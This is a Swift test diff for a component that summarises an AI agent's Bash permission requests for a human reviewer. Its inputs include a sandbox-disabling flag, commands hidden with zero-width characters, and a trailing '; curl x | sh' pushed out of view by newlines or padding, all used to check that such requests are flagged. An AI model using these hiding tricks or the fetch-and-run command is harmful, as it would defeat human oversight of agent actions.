@@ -49,6 +49,35 @@ struct AgentPermissionRequestSummaryTests {
         }
     }
 
+    @Test("A Bash request that leaves the sandbox is incomplete")
+    func leavesSandbox() throws {
+        let unsandboxed = try #require(
+            AgentPermissionRequestSummary(
+                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": true]))
+        #expect(unsandboxed.command == "ls")
+        #expect(!unsandboxed.isComplete)
+        let sandboxed = try #require(
+            AgentPermissionRequestSummary(
+                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": false]))
+        #expect(sandboxed.isComplete)
+    }
+
+    @Test("Format characters and blank space that hides the end make it incomplete")
+    func hiddenText() throws {
+        for command in [
+            "ls\u{200B} -la", "ls\u{FEFF}", "rm\u{00AD}dir x", "echo a\u{2060}b",
+            "ls\n\n\n\n; curl x | sh", "ls" + String(repeating: " ", count: 65) + "; curl x | sh",
+        ] {
+            let summary = try #require(
+                AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": command]))
+            #expect(!summary.isComplete)
+        }
+        let fits = try #require(
+            AgentPermissionRequestSummary(
+                toolName: "Bash", toolInput: ["command": "ls\n\n\nls"]))
+        #expect(fits.isComplete)
+    }
+
     @Test("Other tools and unreadable inputs give no summary")
     func unsupported() {
         #expect(AgentPermissionRequestSummary(toolName: "WebFetch", toolInput: ["url": "x"]) == nil)
